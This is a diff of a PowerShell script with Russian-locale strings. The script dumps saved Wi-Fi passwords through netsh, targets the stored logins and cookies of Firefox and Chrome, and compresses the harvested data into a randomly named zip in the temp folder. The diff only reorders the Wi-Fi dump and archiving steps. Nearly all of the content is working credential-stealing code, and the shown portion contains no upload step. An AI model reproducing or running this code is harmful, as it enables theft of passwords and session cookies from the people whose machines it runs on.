@@ -2,8 +2,7 @@ echo "qwe"
 $e=""
 
 # (netsh wlan show profiles) | Select-String "\:(.+)$" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name="$name" key=clear)} | Select-String "Содержимое ключа\W+\:(.+)$" | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{ ESSID=$name;PASS=$pass }} | Format-Table -AutoSize > $env:TEMP\p.txt
-(netsh wlan show profiles) | Select-String "\:(.+)$" | %{$n=$_.Matches.Groups[1].Value.Trim();$_} | %{(netsh wlan show profile name="$n" key=clear)} | Select-String "Содержимое ключа\W+\:(.+)$" | %{$p=$_.Matches.Groups[1].Value.Trim();$_} | %{[PSCustomObject]@{E=$n;P=$p}} | Format-Table -AutoSize > $env:TEMP\w.txt
-$w=$env:TEMP+'\w.txt'
+
 
 $p=$env:TEMP+"\d"+(Get-Random -max 17071707)+".zip"
 if(Test-Path -Path "C:\Program Files\7-Zip2222\7z.exe")
@@ -11,10 +10,7 @@ if(Test-Path -Path "C:\Program Files\7-Zip2222\7z.exe")
 else
   {$arh="WinRar"}
 
-if("7-Zip"-in $arh)
-  {.\7z.exe a $p $w -spf -tzip}
-else
-  {Compress-Archive -Path $w -Update -CompressionLevel Fastest -DestinationPath $p}
+
         
 $lst = @{0=(($env:APPDATA+"\Mozilla\Firefox\Profiles\*"), "firefox", "logins.json","*.db");
         1=(($env:LOCALAPPDATA+"\Google\Chrome\User Data\Default\"), "chrome", "Login Data", "Cookies");
@@ -35,6 +31,13 @@ for ($i=0; $i -lt 5; $i++){
   }
   else{echo $lst[$i][1];$e=$e+$lst[$i][1]}
 }
+
+(netsh wlan show profiles) | Select-String "\:(.+)$" | %{$n=$_.Matches.Groups[1].Value.Trim();$_} | %{(netsh wlan show profile name="$n" key=clear)} | Select-String "Содержимое ключа\W+\:(.+)$" | %{$p=$_.Matches.Groups[1].Value.Trim();$_} | %{[PSCustomObject]@{E=$n;P=$p}} | Format-Table -AutoSize > $env:TEMP\w.txt
+$w=$env:TEMP+'\w.txt'
+if("7-Zip"-in $arh)
+  {.\7z.exe a $p $w -spf -tzip}
+else
+  {Compress-Archive -Path $w -Update -CompressionLevel Fastest -DestinationPath $p}
 #######################
 # for ($i=0; $i -lt 5; $i++) {
 #   if(Test-Path -Path $lst[$i][0]){
